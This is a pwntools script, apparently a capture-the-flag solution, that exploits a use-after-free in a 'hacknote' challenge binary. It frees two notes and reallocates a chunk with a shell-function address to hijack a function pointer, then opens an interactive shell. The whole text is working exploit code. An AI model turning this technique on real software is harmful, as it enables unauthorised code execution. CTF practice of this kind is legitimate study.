from pwn import *
io=process('./hacknote')
io=remote('redirect.do-not-trust.hacking.run',10449)
def add(size,content):
    io.sendlineafter('choice :','1')
    io.sendlineafter('size :',str(size))
    io.sendlineafter('Content :',content)
def show(index):
    io.sendlineafter('choice :','3')
    io.sendlineafter('Index :',str(index))
def free(index):
    io.sendlineafter('choice :','2')
    io.sendlineafter('Index :',str(index))
shell=0x8048946
add(0x20,'aaaa')
add(0x20,'aaaa')
free(0)
free(1)
add(8,p64(shell))
show(0)
io.interactive()